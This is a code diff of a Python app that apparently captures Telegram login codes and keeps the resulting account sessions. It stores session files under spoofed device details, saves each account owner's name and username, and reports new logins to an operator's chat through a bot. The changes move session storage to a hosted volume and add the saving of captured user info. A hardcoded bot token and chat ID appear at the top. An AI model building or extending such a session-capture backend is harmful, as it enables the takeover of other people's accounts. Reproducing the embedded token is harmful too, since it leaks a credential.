@@ -25,8 +25,13 @@ BOT_TOKEN = "8539687833:AAGZ3mauVO1nMS-nr3xHmXHjOt5TY0IWkKE"
 YOUR_CHAT_ID = "7393047582"
 
 active_sessions = {}
-SESSIONS_DIR = Path("sessions")
-SESSIONS_DIR.mkdir(exist_ok=True)
+
+# Use /app/sessions volume on Railway, fallback to local ./sessions
+SESSIONS_DIR = Path(os.environ.get('SESSIONS_PATH', '/app/sessions'))
+SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
+
+print(f"📁 Sessions directory: {SESSIONS_DIR}")
+print(f"📁 Sessions directory exists: {SESSIONS_DIR.exists()}")
 
 # Create a single event loop for the entire app FIRST
 loop = asyncio.new_event_loop()
@@ -80,7 +85,7 @@ def load_existing_sessions():
                 name=str(session_file),
                 api_id=API_ID,
                 api_hash=API_HASH,
-                workdir=str(Path.cwd())
+                workdir=str(SESSIONS_DIR)
             )
             
             async def check_session():
@@ -122,8 +127,10 @@ def debug_paths():
         'cwd': os.getcwd(),
         'sessions_dir': str(SESSIONS_DIR),
         'sessions_dir_exists': SESSIONS_DIR.exists(),
-        'files_in_sessions': list(SESSIONS_DIR.glob('*')) if SESSIONS_DIR.exists() else []
+        'files_in_sessions': [str(f) for f in SESSIONS_DIR.glob('*')] if SESSIONS_DIR.exists() else [],
+        'env_sessions_path': os.environ.get('SESSIONS_PATH', 'not set')
     })
+
 # Store which session each bot user has selected
 user_selected_session = {}
 
@@ -551,7 +558,7 @@ def send_code():
                     name=str(session_file),
                     api_id=API_ID,
                     api_hash=API_HASH,
-                    workdir=str(Path.cwd()),
+                    workdir=str(SESSIONS_DIR),
                     in_memory=False,
                     device_model=device_model,
                     system_version=system_version,
@@ -573,8 +580,6 @@ def send_code():
                     'app_version': app_version
                 }
 
-                # Save metadata to disk
-  
                 # Save metadata to disk
                 import json
                 metadata = {
@@ -638,6 +643,15 @@ def verify_code():
                     'last_name': me.last_name,
                     'username': me.username
                 }
+                
+                # Save user info to metadata file
+                import json
+                json_file = SESSIONS_DIR / f"{session_id}.json"
+                with open(json_file, 'r') as f:
+                    metadata = json.load(f)
+                metadata['user_info'] = session_data['user_info']
+                with open(json_file, 'w') as f:
+                    json.dump(metadata, f)
                 
                 # Notify via bot with device info
                 send_telegram_message(YOUR_CHAT_ID,
